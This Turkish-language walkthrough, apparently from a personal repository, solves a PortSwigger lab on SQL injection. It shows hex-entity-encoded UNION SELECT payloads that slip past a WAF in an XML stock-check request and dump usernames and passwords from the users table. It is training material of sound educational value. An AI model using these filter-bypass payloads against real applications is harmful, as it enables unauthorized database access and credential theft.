##  XML kodlaması yoluyla filtre atlamalı SQL enjeksiyonu


Bu laboratuvar uygulaması, hisse senedi sorgulama özelliğinde bir SQL enjeksiyonu güvenlik açığı içermektedir. Sorgunun sonuçları uygulamanın yanıtında döndürüldüğü için, diğer tablolardan veri almak üzere bir UNION saldırısı kullanabilirsiniz.

Veritabanında:

-   `users` adlı tablo bulunmaktadır.
    
Amaç:  
`administrator` kullanıcısının parolasını bulup giriş yapmaktır.

Lab açılışı aşağıdaki gibi:
![SQLi with filter bypass via XML encoding ilk](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20ilk.png?raw=true)

Lab açıklamasında uygulamanın sorgu için kullandığı gönderilen xml yükünü buluyoruz:
![SQLi with filter bypass via XML encoding xml](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20xml.png?raw=true)
Aşağıdaki gifte gösterildiği gibi:
![SQLi with filter bypass via XML encoding](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20.gif?raw=true&loop=1&autoplay=1)

Buradaki yükte oynamalar yapıp SQLi olup olmadığını kontrol edebiliriz. `storeId` değerine `+1` ekleyerek sayfa yanıtındaki değişiklik gözlemlenir. Eğer yanıt değişirde burada bir SQLi olduğunu söyleyebiliriz. Yükü yolladığımızda yanıt olarak 48 döndüğünden SQLi var diyebiliriz.
![SQLi with filter bypass via XML encoding kontrol](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20kontrol.png?raw=true)

Sütun sayısını tespit etmek için `order by` yöntemini belirlemeliyiz ama uygulamanın WAF'ı SQL betiklerini tespit ettiğinde isteği düşürmekte. Bunu atlatmak için yollanacak yükler **Hexadecimal entities** olarak encode etmeliyiz [bu sayfa](https://htmlentities.io/) kullanılarak encode edilebilir.
![SQLi with filter bypass via XML encoding yük](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20y%C3%BCk.png?raw=true)
`&#x31;&#x20;&#x6F;&#x72;&#x64;&#x65;&#x72;&#x20;&#x62;&#x79;&#x20;&#x32;` (`Order by 2`) yükünü uyguladığımızda sayfa yanıtı `0 units` göstermekte bu orjinal sorgunun 1 sütun döndüğünü göstermekte.
![SQLi with filter bypass via XML encoding ssayısı2](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20ssay%C4%B1s%C4%B12.png?raw=true)

Bu sütunun string değer kabul ediyor mu bunun kontrolü yapılmalı. Bu `&#x31;&#x20;&#x75;&#x6E;&#x69;&#x6F;&#x6E;&#x20;&#x73;&#x65;&#x6C;&#x65;&#x63;&#x74;&#x20;&#x27;&#x61;&#x27;` (`1 union select 'a'`) yükü uygulayıp sayfa yanıtına baktığımızda yükte yolladığımız string değer yanıtta görünmekte.
![SQLi with filter bypass via XML encoding sttespit](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20sttespit.png?raw=true)

Sayfanın veri tabanı versiyonunu tespit etmek için `&#x31;&#x20;&#x75;&#x6E;&#x69;&#x6F;&#x6E;&#x20;&#x73;&#x65;&#x6C;&#x65;&#x63;&#x74;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6F;&#x6E;&#x28;&#x29;` (`1 union select version()`) yükü uygulasak yanıtta veri tabanı versiyonu görünür.
![SQLi with filter bypass via XML encoding vtespit](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20vtespit.png?raw=true)

Kullanıcı adını ve parolayı almadan önce `users` tablosundaki sütunları bulmalıyız. `&#x31;&#x20;&#x75;&#x6E;&#x69;&#x6F;&#x6E;&#x20;&#x73;&#x65;&#x6C;&#x65;&#x63;&#x74;&#x20;&#x63;&#x6F;&#x6C;&#x75;&#x6D;&#x6E;&#x5F;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x66;&#x72;&#x6F;&#x6D;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x5F;&#x73;&#x63;&#x68;&#x65;&#x6D;&#x61;&#x2E;&#x63;&#x6F;&#x6C;&#x75;&#x6D;&#x6E;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6C;&#x65;&#x5F;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x3D;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;` (`1 union select column_name from information_schema.columns where table_name = 'users'`) yükünü uygularsak `users` tablosundaki sütunlar yanıtta görünür.
![SQLi with filter bypass via XML encoding ustespit](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20ustespit.png?raw=true)

Şimdi bu bilgileri kullanarak `users` tablosundaki kullanıcılar ve parololar yanıtta yazdırılabilir. `&#x31;&#x20;&#x75;&#x6E;&#x69;&#x6F;&#x6E;&#x20;&#x73;&#x65;&#x6C;&#x65;&#x63;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x7C;&#x7C;&#x27;&#x20;&#x3A;&#x20;&#x27;&#x7C;&#x7C;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x66;&#x72;&#x6F;&#x6D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;` (`1 union select username||' : '||password from users`) yükünü uygularsak tablodaki tüm kullanıcılar ve şifreleri yanıtta yazdırılır.
![SQLi with filter bypass via XML encoding pbulma](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20pbulma.png?raw=true)

Son olarak labı çözmek için bulduğumuz kullanıcı adı ve parola ile giriş yapmakta:
![SQLi with filter bypass via XML encoding çözüm](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/SQLi%20with%20filter%20bypass%20via%20XML%20encoding%20%C3%A7%C3%B6z%C3%BCm.png?raw=true)

Linkden labı kendiniz çözbilirsiniz:</br>
https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding



